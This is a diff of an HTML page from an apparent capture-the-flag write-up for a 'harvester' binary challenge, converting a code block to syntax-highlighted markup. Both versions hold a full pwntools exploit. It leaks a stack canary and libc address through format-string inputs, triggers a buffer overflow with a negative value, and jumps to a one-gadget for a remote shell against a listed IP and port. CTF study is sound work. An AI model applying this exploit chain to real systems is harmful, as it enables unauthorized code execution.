@@ -85,74 +85,58 @@
 <div>
     <img src="../imgs/cyber_apocalypse/harvester6.png" alt="">
 </div>
-<div>
-    <style 
-        type="text/css">
-            pre code {
-                      background-color: #008080;
-                      border: 1px solid #999;
-                      display: block;
-                      padding: 15px;
-                      color:  #F5F5DC;
-                    }
-    </style>
-    <pre>
-        <code>
-#!/usr/bin/env python
+<div class="highlight" style="background: #002b36"><pre style="line-height: 125%;"><span></span><span style="color: #586e75; font-style: italic">#!/usr/bin/env python</span>
 
-from pwn import *
-elf = context.binary = ELF('./harvester')
-libc = elf.libc
+<span style="color: #cb4b16">from</span> <span style="color: #268bd2">pwn</span> <span style="color: #cb4b16">import</span> <span style="color: #586e75">*</span>
+<span style="color: #839496">elf</span> <span style="color: #586e75">=</span> <span style="color: #839496">context</span><span style="color: #586e75">.</span><span style="color: #839496">binary</span> <span style="color: #586e75">=</span> <span style="color: #839496">ELF(</span><span style="color: #2aa198">'./harvester'</span><span style="color: #839496">)</span>
+<span style="color: #839496">libc</span> <span style="color: #586e75">=</span> <span style="color: #839496">elf</span><span style="color: #586e75">.</span><span style="color: #839496">libc</span>
 
-local = False
+<span style="color: #839496">local</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">False</span>
 
-if local:
-    p = elf.process()
-else:
-    host = '138.68.187.25'
-    port = 30023
-    p = remote(host,port)
+<span style="color: #859900">if</span> <span style="color: #839496">local:</span>
+    <span style="color: #839496">p</span> <span style="color: #586e75">=</span> <span style="color: #839496">elf</span><span style="color: #586e75">.</span><span style="color: #839496">process()</span>
+<span style="color: #859900">else</span><span style="color: #839496">:</span>
+    <span style="color: #839496">host</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">'138.68.187.25'</span>
+    <span style="color: #839496">port</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">30023</span>
+    <span style="color: #839496">p</span> <span style="color: #586e75">=</span> <span style="color: #839496">remote(host,port)</span>
 
-p.clean()
-p.sendline('1')
-p.clean()
-p.sendline('%11$p')
-p.readuntil('Your choice is: ')
-data = p.readuntil('\n').strip()[:-7]   #Leak Cookie
-p.clean()
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">clean()</span>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(</span><span style="color: #2aa198">'1'</span><span style="color: #839496">)</span>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">clean()</span>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(</span><span style="color: #2aa198">'%11$p'</span><span style="color: #839496">)</span>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">readuntil(</span><span style="color: #2aa198">'Your choice is: '</span><span style="color: #839496">)</span>
+<span style="color: #839496">data</span> <span style="color: #586e75">=</span> <span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">readuntil(</span><span style="color: #2aa198">'\n'</span><span style="color: #839496">)</span><span style="color: #586e75">.</span><span style="color: #839496">strip()[:</span><span style="color: #586e75">-</span><span style="color: #2aa198">7</span><span style="color: #839496">]</span>   <span style="color: #586e75; font-style: italic">#Leak Cookie</span>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">clean()</span>
 
-cookie = int(data,16)
+<span style="color: #839496">cookie</span> <span style="color: #586e75">=</span> <span style="color: #268bd2">int</span><span style="color: #839496">(data,</span><span style="color: #2aa198">16</span><span style="color: #839496">)</span>
 
-p.clean()
-p.sendline('1')
-p.clean()
-p.sendline('%3$p')
-p.readuntil('Your choice is: ')
-data = p.readuntil('\n').strip()        #Leak Libc Address
-print(data)
-p.clean()
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">clean()</span>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(</span><span style="color: #2aa198">'1'</span><span style="color: #839496">)</span>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">clean()</span>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(</span><span style="color: #2aa198">'%3$p'</span><span style="color: #839496">)</span>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">readuntil(</span><span style="color: #2aa198">'Your choice is: '</span><span style="color: #839496">)</span>
+<span style="color: #839496">data</span> <span style="color: #586e75">=</span> <span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">readuntil(</span><span style="color: #2aa198">'\n'</span><span style="color: #839496">)</span><span style="color: #586e75">.</span><span style="color: #839496">strip()</span>        <span style="color: #586e75; font-style: italic">#Leak Libc Address</span>
+<span style="color: #268bd2">print</span><span style="color: #839496">(data)</span>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">clean()</span>
 
-leak = int(data,16)
+<span style="color: #839496">leak</span> <span style="color: #586e75">=</span> <span style="color: #268bd2">int</span><span style="color: #839496">(data,</span><span style="color: #2aa198">16</span><span style="color: #839496">)</span>
 
-libc.address = leak - 0xe4774           #Libc Base
-one = p64(libc.address + 0x4f3d5)       #One Gadget
+<span style="color: #839496">libc</span><span style="color: #586e75">.</span><span style="color: #839496">address</span> <span style="color: #586e75">=</span> <span style="color: #839496">leak</span> <span style="color: #586e75">-</span> <span style="color: #2aa198">0xe4774</span>           <span style="color: #586e75; font-style: italic">#Libc Base</span>
+<span style="color: #839496">one</span> <span style="color: #586e75">=</span> <span style="color: #839496">p64(libc</span><span style="color: #586e75">.</span><span style="color: #839496">address</span> <span style="color: #586e75">+</span> <span style="color: #2aa198">0x4f3d5</span><span style="color: #839496">)</span>       <span style="color: #586e75; font-style: italic">#One Gadget</span>
 
-payload = b'A'*40 + p64(cookie) + b'A'*8 + one
+<span style="color: #839496">payload</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">b'A'</span><span style="color: #586e75">*</span><span style="color: #2aa198">40</span> <span style="color: #586e75">+</span> <span style="color: #839496">p64(cookie)</span> <span style="color: #586e75">+</span> <span style="color: #2aa198">b'A'</span><span style="color: #586e75">*</span><span style="color: #2aa198">8</span> <span style="color: #586e75">+</span> <span style="color: #839496">one</span>
 
-p.clean()
-p.sendline('2')
-p.clean()
-p.sendline('y')
-p.clean()
-p.sendline('-11')                       #Set cookies to 22 to trigger buffer overflow
-p.clean()
-p.sendline('3')
-p.sendline(payload)
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">clean()</span>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(</span><span style="color: #2aa198">'2'</span><span style="color: #839496">)</span>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">clean()</span>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(</span><span style="color: #2aa198">'y'</span><span style="color: #839496">)</span>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">clean()</span>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(</span><span style="color: #2aa198">'-11'</span><span style="color: #839496">)</span>                       <span style="color: #586e75; font-style: italic">#Set cookies to 22 to trigger buffer overflow</span>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">clean()</span>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(</span><span style="color: #2aa198">'3'</span><span style="color: #839496">)</span>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(payload)</span>
 
-p.interactive()
-        </code>
-    </pre>
-</div>
-<br><br>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">interactive()</span>
+</pre></div>
 
 <script>try {pageOpenedDirectly;} catch(e) {var loc = window.location.pathname;var dir = loc.substring(0, loc.lastIndexOf('/'));dir = dir.split("/")[dir.split("/").length-1];let currentLoc = location.href;let currentFile = location.href.split("/").slice(-1);currentLoc = currentLoc.replace(currentFile,"");currentLoc = currentLoc.replace(dir,"");currentLoc = currentLoc.slice(0, -1);if (currentFile[0].indexOf(".html") !== -1) currentFile = currentFile[0].slice(0, -5);window.location = currentLoc+"?p="+currentFile+"&d="+dir;}</script>
